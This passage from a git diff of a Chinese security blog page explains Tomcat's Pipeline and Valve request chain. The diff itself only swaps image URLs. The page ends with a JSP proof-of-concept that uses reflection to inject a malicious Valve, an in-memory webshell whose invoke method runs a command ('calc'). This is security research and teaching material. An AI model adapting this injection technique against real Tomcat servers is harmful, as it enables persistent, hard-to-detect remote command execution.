class="line">standardContext.addApplicationEventListener(servletRequestListener);</span><br></pre></td></tr></table></figure>
 
@@ -520,9 +520,9 @@
 <p>Tomcat在处理一个请求调用逻辑的时候,传递Request和Response对象使用了职责链模式</p>
 <p>Tomcat定义了两个接口Pipeline(管道)和Valve(阀门)</p>
 <p>Pipeline接口的实现类是<code>StandardPipeline</code></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172150621.png" alt="image-20220423172150621"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172150621.png" alt="image-20220423172150621"></p>
 <p>Valve一般直接使用其实现类ValveBase</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172202365.png" alt="image-20220423172202365"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172202365.png" alt="image-20220423172202365"></p>
 <p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 基础Valve之前，并按照添加顺序执行。</p>
 <p>首先要了解的是每一种<code>container</code>都有一个自己的<code>StandardValve</code>(也就是基础Value)</p>
 <ul>
@@ -536,19 +536,19 @@
 </li>
 </ul>
 <p>这些<code>Valve</code>会将接收到的数据扔给下一个<code>Container</code>的<code>Pipeline</code></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423172536815.png" alt="image-20220423172536815"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172536815.png" alt="image-20220423172536815"></p>
 <p>Pipeline就像一个工厂中的生产线，负责调配工人（valve）的位置，valve则是生产线上负责不同操作的工人。<br>一个生产线的完成需要两步：<br>1，把原料运到工人边上<br>2，工人完成自己负责的部分</p>
 <p>而tomcat的Pipeline实现是这样的：<br>1，在生产线上的第一个工人拿到生产原料后，二话不说就扔给下一个工人，下一个工人模仿第一个工人那样扔给下一个工人，直到最后一个工人，而最后一个工人被安排为上面提过的StandardValve，他要完成的工作居然是把生产资料运给自己包含的container的Pipeline上去。<br>2，四个container就相当于有四个生产线（Pipeline），四个Pipeline都这么干，直到最后的StandardWrapperValve拿到资源开始调用servlet。完成后返回来，一步一步的valve按照刚才丢生产原料是的顺序的倒序一次执行。如此才完成了tomcat的Pipeline的机制。</p>
 <p>代码调用的地方</p>
 <p>Adapter连接了Tomcat连接器<code>Connector</code>和容器<code>Container</code>它的实现类是<code>CoyoteAdapter</code>主要负责的是对请求进行封装,构造Request和Response对象.并将请求转发给Container也就是Servlet容器.</p>
 <p>在<code>CoyoteAdapter</code>的<code>service</code>方法中调用了valve的invoke方法</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173023450.png" alt="image-20220423173023450"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423173023450.png" alt="image-20220423173023450"></p>
 <p>这里调用的是StandardEngineValve的invoke方法</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423173256592.png" alt="image-20220423173256592"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423173256592.png" alt="image-20220423173256592"></p>
 <p>它在最后调用了Host容器的第一个Valve的invoke方法,如此像一条链一样走到之前写恶意valve的地方</p>
 <h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><p>在获取pipeline的时候有个小坑,我看见StandardContext在调试的时候有pipeline属性就以为它里面有这个属性,但是其实是在他继承的ContainerBase类里面呢</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171315008.png" alt="image-20220423171315008"></p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220423171440443.png" alt="image-20220423171440443"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423171315008.png" alt="image-20220423171315008"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423171440443.png" alt="image-20220423171440443"></p>
 <p>同时代码稍作修改,也可以往host或者wrapper中添加恶意Valve</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//首先获取context,往context的管道中添加恶意Valve</span></span><br><span class="line"></span><br><span class="line">    Field requestField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Request request1 =(Request) requestField.get(request);</span><br><span class="line">    StandardContext context =(StandardContext) request1.getContext();</span><br><span class="line">    <span class="comment">//    StandardHost standardHost = (StandardHost) request1.getHost();</span></span><br><span class="line">    <span class="comment">//    StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper();</span></span><br><span class="line">    Field pipelineField = ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardPipeline standardPipeline= (StandardPipeline) pipelineField.get(context);</span><br><span class="line">    <span class="comment">//   StandardPipeline standardPipeline2 = (StandardPipeline) pipelineField.get(standardHost);</span></span><br><span class="line">    <span class="comment">//   StandardPipeline standardPipeline3 = (StandardPipeline) pipelineField.get(standardWrapper);</span></span><br><span class="line"></span><br><span class="line">    ValveBase valveBase = <span class="keyword">new</span> ValveBase()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    standardPipeline.addValve(valveBase);</span><br><span class="line">    </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
